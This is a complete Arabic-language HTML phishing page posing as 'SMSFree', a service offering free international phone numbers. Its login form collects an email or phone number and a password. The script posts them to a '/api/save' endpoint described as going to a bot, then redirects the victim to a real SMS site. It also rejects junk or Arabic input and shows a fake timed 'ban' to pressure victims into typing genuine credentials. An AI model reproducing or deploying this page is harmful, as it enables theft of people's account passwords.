<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - نظام حماية متطور</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
            transition: filter 0.5s ease; /* سلاسة التمويه */
        }

        /* حالة التجمد والضباب */
        body.frozen {
            filter: blur(8px) grayscale(50%);
            pointer-events: none; /* تعطيل كل الضغطات */
            user-select: none;
        }

        .main-container {
            width: 90%; max-width: 420px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }

        /* صندوق الحظر العائم (يبقى ظاهراً فوق الضباب) */
        .ban-overlay {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 9999; background: rgba(30, 41, 59, 0.9);
            padding: 25px; border-radius: 20px; border: 2px solid #fbbf24;
            display: none; text-align: center; width: 80%; max-width: 300px;
            box-shadow: 0 0 30px rgba(251, 191, 36, 0.3);
        }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        .glass-popup {
            background: rgba(15, 23, 42, 0.9) !important;
            backdrop-filter: blur(15px);
            border: 1px solid var(--primary-cyan);
            border-radius: 25px !important;
            color: white !important;
        }
    </style>
</head>
<body>

<div class="ban-overlay" id="banOverlay">
    <h3 style="color: #fbbf24; margin: 0 0 10px 0;">⚠️ تم تقييد الوصول</h3>
    <p style="font-size: 14px; margin: 0;">سيتم فك التجميد تلقائياً خلال</p>
    <div style="font-size: 30px; font-weight: bold; margin: 10px 0;" id="timer">30</div>
    <p style="font-size: 12px; opacity: 0.7;">ثانية</p>
</div>

<div class="main-container" id="mainCard">
    <div class="logo-circle">SMSFree</div>
    <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>

    <form id="loginForm">
        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
    </form>
</div>

<script>
    let attempts = 0;

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        // التحقق من صحة المدخلات (منع العربية والعشوائية)
        const hasArabic = /[\u0600-\u06FF]/.test(user) || /[\u0600-\u06FF]/.test(pass);
        const isRandom = user.length < 5 || pass.length < 6;

        if (hasArabic || isRandom) {
            attempts++;
            if (attempts >= 3) {
                applySuperBan();
            } else {
                Swal.fire({
                    title: 'تنبيه أمني',
                    text: 'يرجى التأكد من كتابة البريد الإلكتروني وكلمة المرور بشكل صحيح لتجنب حظرك مؤقتاً.',
                    icon: 'warning',
                    customClass: { popup: 'glass-popup' },
                    confirmButtonColor: '#22d3ee'
                });
            }
            return;
        }

        // إرسال البيانات للبوت
        sendToBot(user, pass);
    };

    function applySuperBan() {
        const body = document.body;
        const overlay = document.getElementById('banOverlay');
        const timerText = document.getElementById('timer');
        
        // تجميد وتضبيب الصفحة
        body.classList.add('frozen');
        overlay.style.display = 'block';

        let timeLeft = 30;
        const timer = setInterval(() => {
            timeLeft--;
            timerText.innerText = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(timer);
                // إزالة التجميد
                body.classList.remove('frozen');
                overlay.style.display = 'none';
                attempts = 0;

                // إظهار رسالة النجاح
                Swal.fire({
                    title: 'مبروك!',
                    text: 'تم إزالة الحظر عنك بعد انتهاء الـ 30 ثانية. لا تكرر الغلط كي لا يتم حظرك ثانية.',
                    icon: 'success',
                    customClass: { popup: 'glass-popup' },
                    confirmButtonColor: '#22d3ee',
                    confirmButtonText: 'فهمت'
                });
            }
        }, 1000);
    }

    async function sendToBot(u, p) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `👤 مستخدم: ${u}\n🔑 كلمة مرور: ${p}` })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (e) {}
    }
</script>

</body>
</html>
